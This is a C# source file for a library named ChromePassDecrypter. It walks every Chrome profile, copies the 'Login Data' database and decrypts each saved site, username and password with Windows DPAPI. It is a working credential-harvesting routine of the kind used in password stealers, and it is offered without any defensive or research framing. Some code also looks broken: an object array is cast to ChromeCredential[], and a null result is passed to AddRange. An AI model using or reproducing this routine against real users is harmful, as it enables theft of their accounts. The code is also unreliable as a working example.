/*
 * This is free and unencumbered software released into the public domain.
 *
 * Anyone is free to copy, modify, publish, use, compile, sell, or
 * distribute this software, either in source code form or as a compiled
 * binary, for any purpose, commercial or non-commercial, and by any
 * means.
 *
 * In jurisdictions that recognize copyright laws, the author or authors
 * of this software dedicate any and all copyright interest in the
 * software to the public domain. We make this dedication for the benefit
 * of the public at large and to the detriment of our heirs and
 * successors. We intend this dedication to be an overt act of
 * relinquishment in perpetuity of all present and future rights to this
 * software under copyright law.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
 * EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
 * MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
 * IN NO EVENT SHALL THE AUTHORS BE LIABLE FOR ANY CLAIM, DAMAGES OR
 * OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE,
 * ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
 * OTHER DEALINGS IN THE SOFTWARE.
 *
 * For more information, please refer to <http://unlicense.org>
 */
using System;
using System.Collections;
using System.Data.SQLite;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace ChromePassDecrypter
{
	/// <summary>
	/// Provides static functions for decrypting passwords stored by Google Chrome
	/// </summary>
	public static class ChromePasswords
	{
		private static string pathToProfiles = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data";
		
		public static ChromeCredential[] GetPasswords()
		{
			ArrayList result = new ArrayList();
			DirectoryInfo dirInfo = new DirectoryInfo(pathToProfiles);
			DirectoryInfo[] subDirInfo = dirInfo.GetDirectories();
			
			for (int i = 0; i < subDirInfo.Length; i++)
			{
				// These directories are not important for us
				if (subDirInfo[i].Name == "PepperFlash" ||
				    subDirInfo[i].Name == "Performance Monitor Databases" ||
				    subDirInfo[i].Name == "pnacl" ||
				    subDirInfo[i].Name == "SwiftShader" ||
				    subDirInfo[i].Name == "Temp" ||
				    subDirInfo[i].Name == "WidevineCDM")
				{
					continue;
				}
				
				result.AddRange(GetPasswords(subDirInfo[i].FullName + @"\Login Data"));
			}
			
			return (ChromeCredential[])result.ToArray();
		}
		
		private static ChromeCredential[] GetPasswords(string pathToPasswordsFile)
		{
			if (!File.Exists(pathToPasswordsFile))
			{
				return null;
			}
			
			// We need to copy the file because it may be locked
			string tempFile = Path.GetTempFileName();
			File.Copy(pathToPasswordsFile, tempFile);
			
			ArrayList result = new ArrayList();
			
			using (SQLiteConnection conn = new SQLiteConnection("Data Source=" + tempFile + ";Version=3;New=True;Compress=True;"))
			{
				conn.Open();
				
				using (SQLiteCommand comm = conn.CreateCommand())
				{
					comm.CommandText = "SELECT origin_url, username_value, password_value FROM logins";
					
					using (SQLiteDataReader reader = comm.ExecuteReader())
					{
						while (reader.Read())
						{
							string originUrl = (string)reader["origin_url"];
							string username = (string)reader["username_value"];
							string password;
							try
							{
								password = Encoding.UTF8.GetString(ProtectedData.Unprotect((byte[])reader["password_value"], null, DataProtectionScope.CurrentUser));
							}
							catch (Exception ex)
							{
								password = "Password could not be retrieved: " + ex.Message;
							}
							result.Add(new ChromeCredential(originUrl, username, password));
						}
					}
				}
			}
			
			try
			{
				File.Delete(tempFile);
			}
			catch
			{
				// Well.. don't know what happened here and I don't care..
				// Some tweaking tools will clean this folder at some point..
			}
			
			return (ChromeCredential[])result.ToArray();
		}
	}
}